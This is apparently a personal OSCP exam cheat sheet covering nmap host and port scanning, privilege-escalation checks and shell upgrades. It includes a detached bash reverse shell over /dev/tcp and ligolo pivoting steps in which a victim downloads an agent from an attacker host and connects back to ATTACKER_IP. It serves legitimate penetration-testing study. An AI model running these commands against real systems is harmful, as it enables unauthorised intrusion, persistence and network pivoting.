# OSCP-CheatSheet
My personal cheat sheet for the OSCP exam, I Also have added to the repo some key tools for easy access.

## Information Gathering & Enumeration:

### Host Discovery 
**Basic host discovery:**

`sudo nmap -sn <ip-range>`

Remember Windows machines drop ICMP packets by default (-Pn) and when tunneling with ligolo sync scans (-sS) don't work. But we can use 

`nmap -sT -sU -Pn -p T:22,80,443,445,3389,U:53,123,161 <ip-range>`

### Port Scanning
I like to seperate port discovery from port enumeration, I think it's more organized and saves time.

**Port Discovery:**
Be thorough scan every TCP and UDP port, taking your time on enumeration saves you time in the long run. 

`nmap -Pn -sS -p- -T5 <ip>`

`nmap -Pn -sU -p- -T5 <ip>`

**Port Enumeration:**

`nmap -sS -sV -sC -p <ports> -T5 <ip>`

`nmap -sU -sV -sC -p <ports> -T5 <ip>`

`nmap -sV --script vuln -p <ports> <ip>`

## Exploitation:

### Reverse Shell Payloads
This payload is a normal bash revshell, but I used `nohup` and `disown`  to detach the process so it doesn't die if the current session gets closed 

`( nohup setsid bash -c 'YOUR_NEW_CONNECTION_COMMAND_HERE' >/dev/null 2>&1 & ) ; disown`

`( nohup setsid bash -c "exec bash -i &>/dev/tcp/<ip>/<port> <&1" >/dev/null 2>&1 & ) ; disown`

## Post-Exploitation:

### Upgrading a simple Shell
**using python (full tty):**
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. Background the shell with Ctrl+z
4. `stty raw -echo; fg`
5. `stty rows 38 columns 116`

**using system os:**
`echo os.system("/bin/bash")`

**using Bash:**
`/bin/sh -i`

**using Vi:**
`:!bash`

`:set shell=/bin/bash:shell`

### Privilege Escalation:
My approach to privilege escalation is simple, Attempt the low-hanging fruit / easy wins. If that doesn't work Information Gather and Enumerate the system, then try the more complex Exploits.

**Windows:**

Attempt low hanging fruit:
- [ ] whoami /priv
- [ ] readable SAM & SYSTEM files 

**Linux:**

Attempt low hanging fruit:
- [ ] sudo --version
- [ ] sudo -l
- [ ] find / -perm -u=s  -type f 2>/dev/null
- [ ] find / -writable

### Pivoting & Tunneling

setup proxy
```attacker-machine
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

Send the ligolo-agent to the victim

```attacker-machine
python3 -m http.server 80
```

```victim-machine
curl http://<ip>/ligolo-agent > ligolo-agent
chmod +x ligolo-agent
./agent_linux_amd64 -connect ATTACKER_IP:11601 -ignore-cert
```

now on the proxy you can setup the connection using autoroute.
